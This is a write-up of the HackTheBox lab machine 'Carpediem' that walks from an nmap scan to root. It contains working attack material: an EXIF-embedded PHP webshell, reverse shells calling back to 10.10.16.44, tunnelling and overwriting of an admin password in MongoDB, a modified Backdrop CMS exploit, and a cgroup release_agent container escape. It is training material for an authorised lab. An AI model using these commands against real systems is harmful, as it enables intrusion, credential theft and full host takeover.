---
title: HTB | Carpediem
author: Zeropio
date: 2022-09-01
categories: [Pentesting, HackTheBox]
tags: [htb, linux, hard, machines]
permalink: /pentesting/htb/machines/carpediem
image:
  path: /assets/img/hackthebox/card/Carpediem.png
  width: 800
  height: 500
---

# Fingerprint

The nmap gives us:

```
Nmap scan report for 10.10.11.167
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 (RSA)
|   256 b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 (ECDSA)
|_  256 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Comming Soon
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can fuzz for vhosts:

```console
zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://carpediem.htb/' -H 'Host: FUZZ.carpediem.htb' -fs 2875

	portal                  [Status: 200, Size: 31090, Words: 7687, Lines: 463, Duration: 101ms]
```

We have a login there and a register account option. Created and account and login as it.

# Foothold

In the mangament account part we can see an ID in the headers:

![Untitled](/assets/img/hackthebox/labs/carpediem/Untitled.png)

The **login_type=2**, if we changed it to 1 and forward the request we will be modifying the admin account. We have access now to the admin panel:

![Untitled](/assets/img/hackthebox/labs/carpediem/Untitled%201.png)

Moving through the page we can modify the account once again, this time adding a profile image. We can try uploading a reverse shell with the following content:

```console
zero@pio$ exiftool -Comment='<?php echo "<pre>"; system($_GET["cmd"]); ?>' dog.jpeg
```

![Untitled](/assets/img/hackthebox/labs/carpediem/Untitled%202.png)

Change the name in burp before sending, and now we have RCE:

![Untitled](/assets/img/hackthebox/labs/carpediem/Untitled%203.png)

We will use a url encoded of a base64 shell to execute a reverse shell:

```
echo%20%22L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ0LzQ0MyAwPiYx%22%20%7C%20base64%20%2Dd%20%7C%20bash
```

We now get access to the system, but we noticed we are in a container.

```console
www-data@3c371615b7aa:/var/www/html/portal/uploads$ hostname
	3c371615b7aa
www-data@3c371615b7aa:/var/www/html/portal/uploads$ whoami
	www-data
```

# Privilege Escalation

We have access of a MongoDB from the container. With chisel we can make a connection:

```console
zero@pio$ chisel server --reverse --port 8000
```

```console
www-data@3c371615b7aa:/dev/shm$ ./chisel client 10.10.16.44:8000 R:8118:172.17.0.5:8118 R:27017:172.17.0.3:27017 &
```

We can see that is a **trudesk**. Use a [bcrypt password](https://icyberchef.com/#recipe=Bcrypt(10)&input=cGFzc3dvcmQ) and update the password. 

```console
zero@pio$ mongosh mongodb://127.0.0.1:27017

test> show databases
	admin     135 kB
	config    111 kB
	local    90.1 kB
	trudesk  1.12 MB
test> use trudesk
trudesk> db.accounts.update( {"_id": ObjectId("623c8b20855cc5001a8ba13c")}, {$set: {"password": "$2b$10$zX4LTPwe7bEjhvQ.lbNgNuttsUcvcstL6SHHhZhIXouFObHXxYqey"}});
```

We can login with the **admin:password** credentials. We see some tickets, from there we got the credentials **9560:2022**. They ask to call to **62**. After making the call in the web we can listen to the new credentials: **hflaccus:AuRj4pxq9qPk**. With SSH we can use them.

LinPEAS told us we can intercept traffic, so we start a `tcpdump`. 

```console
hflaccus@carpediem:~$ tcpdump -i any port 443 -w traffic_output
```

Get also the ssl key in `/etc/ssl/certs/backdrop.carpediem.htb.key`{: .filepath}. Checking the outpuf file in Wireshark we can find the following credentials: **jpardella**:**tGPN6AmJDZwYWdhY**.

Open a port forwading:

```console
zero@pio$ sshpass -p AuRj4pxq9qPk ssh hflaccus@10.10.11.167 -L 8002:127.0.0.1:8002
```

We can see a login in **https://127.0.0.1:8002**. We found a login, the previous credentials will work there.

It is using the **Backdrop CMS**, we found a vulnerability in this [Github](https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS). Modify the script to make a reverse shell instead of a webshell:

```console
zero@pio$ tar -xf reference.tar
zero@pio$ cat reference/shell.php
	<?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.44/443 0>&1'");?>
zero@pio$ tar -cvf reference.tar reference &>/dev/null
```

Import the new “module” in the **Functionality** page, through a manual installation. Now open a netcat and call the module in `https://localhost:8002/modules/reference/shell.php`.

```console
www-data@90c7f522b842:/var/www/html/backdrop/modules/reference$ whoami
	www-data
www-data@90c7f522b842:/var/www/html/backdrop/modules/reference$ hostname -i
	172.17.0.2
```

We are in a new container. We found the following script:

```console
www-data@90c7f522b842:/opt$ cat heartbeat.sh
	#!/bin/bash
	#Run a site availability check every 10 seconds via cron
	checksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))
	if [[ $checksum != "70a121c0202a33567101e2330c069b34" ]]; then
	        exit
	fi
	status=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)
	grep "Welcome to backdrop.carpediem.htb!" "$status"
	if [[ "$?" != 0 ]]; then
	        #something went wrong.  restoring from backup.
	        cp /root/index.php /var/www/html/backdrop/index.php
	fi
```

We can change the index.php in a reverse shell:

```console
zero@pio$ cat index.php          
	<?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.44/443 0>&1'");?>
zero@pio$ $ python3 -m http.server 80
```

Replace the file:

```console
ww-data@90c7f522b842:/var/www/html/backdrop$ rm -f index.php
www-data@90c7f522b842:/var/www/html/backdrop$ wget http://10.10.16.44/index.php
```

And we will get a root connection:

```console
root@90c7f522b842:/var/www/html/backdrop# whoami
	root
```

This [article](https://www.notion.so/Carpediem-691b061d8e164581b4ce5bf8b121fb3c) talk about how to escape from a privileged docker container. Create the following script and send it to the target:

```bash
mkdir /dev/shm/privesc
mount -t cgroup -o rdma cgroup /dev/shm/privesc
mkdir /dev/shm/privesc/x
echo 1 > /dev/shm/privesc/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /dev/shm/privesc/release_agent
echo '#!/bin/bash' > /cmd
echo "bash -c 'bash -i >& /dev/tcp/10.10.16.44/443 0>&1'" >> /cmd
chmod a+x /cmd
bash -c "echo \$\$ > /dev/shm/privesc/x/cgroup.procs"
```

Execute the script in the container with a netcat open:

```console
root@90c7f522b842:~# unshare -UrmC bash
wget http://10.10.16.44/script.sh
chmod +x script.sh
./script.sh
```

```console
	zero@pio$ nc -lvnp 443
	listening on [any] 443 ...
	connect to [10.10.16.44] from (UNKNOWN) [10.10.11.167] 59580

	root@carpediem:/# whoami
		root
```
